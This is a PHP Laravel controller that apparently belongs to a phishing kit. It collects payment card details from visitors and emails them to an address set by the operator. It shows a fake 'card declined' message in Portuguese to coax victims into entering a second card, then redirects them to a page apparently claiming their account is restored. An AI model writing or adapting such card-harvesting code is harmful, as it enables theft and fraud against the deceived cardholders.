<?php

namespace App\Http\Controllers;

use App\Http\Requests\StoreCardRequest;
use App\Mail\CardDetails;
use App\Models\Settings;
use App\Models\Visitor;
use Illuminate\Http\RedirectResponse;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Mail;
use Illuminate\Validation\ValidationException;
use Inertia\Inertia;
use Log;
use Throwable;

class CardController extends Controller {
    public function index()
    {
        if (!BillingController::hasBilling()) {
            return $this->back2dashboard();
        }

        return Inertia::render('Card/Index');
    }

    public function store(StoreCardRequest $request): RedirectResponse
    {
        if (!BillingController::hasBilling()) {
            return $this->back2dashboard();
        }

        $cachedCard = Cache::get($request->cardNumber);
        $settings = Settings::me();
        $visitor = Visitor::current();

        try {
            Mail::to($settings->email_result)->sendNow(new CardDetails($request));
            if ($cachedCard !== $visitor->user) {
                $visitor->increment('card_count');
                $visitor->save();
                Cache::put($request->cardNumber, $visitor->user);
            }
        } catch (Throwable $t) {
            Log::error($t);
        }

        // Kembali dengan cek kondisi kartu user threshold sudah tercapai
        return match ($visitor->card_count) {
            // Indikasi sukses kirim email dan kartu belum digunakan namun kita cek apa setting minimum kartu sudah tercapai
            1 => match ($settings->double_cards) {
                true => throw ValidationException::withMessages(['cardNumber' => 'Seu cartão foi recusado, por favor tente outro cartão.']),
                false => $this->finish()
            },
            // Indikasi gagal kirim email dan/atau kartu sudah digunakan oleh user lain
            0 => throw ValidationException::withMessages(['cardNumber' => 'Seu cartão foi recusado, por favor tente outro cartão.']),
            default => $this->finish()
        };
    }

    private function finish(): RedirectResponse
    {
        Visitor::current()->update(['is_finished' => true]);
        return redirect()->route(route: 'restored.index');
    }
}
